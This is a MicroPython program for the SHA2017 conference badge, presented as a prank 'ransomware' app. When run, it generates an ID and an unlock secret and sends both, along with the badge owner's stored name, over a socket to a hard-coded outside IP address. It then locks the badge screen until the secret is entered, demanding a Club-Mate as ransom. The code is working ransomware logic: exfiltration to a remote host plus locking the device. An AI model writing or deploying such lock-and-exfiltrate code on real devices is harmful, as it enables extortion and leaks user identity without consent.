import wifi
import ugfx
import badge
import dialogs
import usocket as socket
import random
import time


ransom_id = ""
ransom_secret = ""
ransom_paid = False
ransom_server_host = "92.222.19.24"
ransom_server_port = 6969


wifi.init()
ugfx.init()
ugfx.input_init()
badge.init()


def generate_key():
    ascii_characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.choice(ascii_characters) for i in range(10))


def load_keys():
    global ransom_id, ransom_secret
    ransom_id = generate_key()
    ransom_secret = generate_key()


def await_wifi():
    while not wifi.sta_if.isconnected():
        time.sleep(0.1)
        pass


def send_keys():
    global ransom_id, ransom_secret
    await_wifi()
    nickname = badge.nvs_get_str("owner", "name", "[no name]")

    sock = socket.socket()
    addr = socket.getaddrinfo(ransom_server_host, ransom_server_port)
    sock.connect(addr[0][-1])
    sock.send(bytes(ransom_id + ":" + ransom_secret + ":" + nickname))
    sock.close()


def write(y, message):
    ugfx.string(20, y, message, "Roboto_Regular12", ugfx.BLACK)


def write_lock():
    global ransom_id
    ugfx.clear(ugfx.WHITE)
    ugfx.string(15, 10, "SHA2017 - Ransomware","Roboto_BlackItalic24", ugfx.BLACK)
    write(40, "Oh noes, your badge is being held hostage!")
    write(52, "Deliver a club mate to the Snowden field.")
    write(64, "We're in the first big tent to the left.")
    write(76, "Be sure to show us this ID: " + ransom_id)
    ugfx.input_attach(ugfx.BTN_START, attempt_unlock)
    write(90, "[press start to unlock]")
    ugfx.flush()


def attempt_unlock(pressed):
    global ransom_secret, ransom_paid
    if not pressed:
        write_lock()
    else:
        secret = dialogs.prompt_text("Ransom secret: ")

        ugfx.clear(ugfx.WHITE)
        ugfx.string(15, 10, "SHA2017 - Ransomware","Roboto_BlackItalic24", ugfx.BLACK)

        if secret == ransom_secret:
            write(40, "Dobby is free!")
            ransom_paid = True
            time.sleep(4)
        else:
            write(40, "INVALID RANSOM SECRET!")
            time.sleep(4)
            write_lock()


# Main - Lock the badge and prompt the user to
# get over here and pay the ransom :)
load_keys()
send_keys()
write_lock()


while not ransom_paid:
    time.sleep(0.1)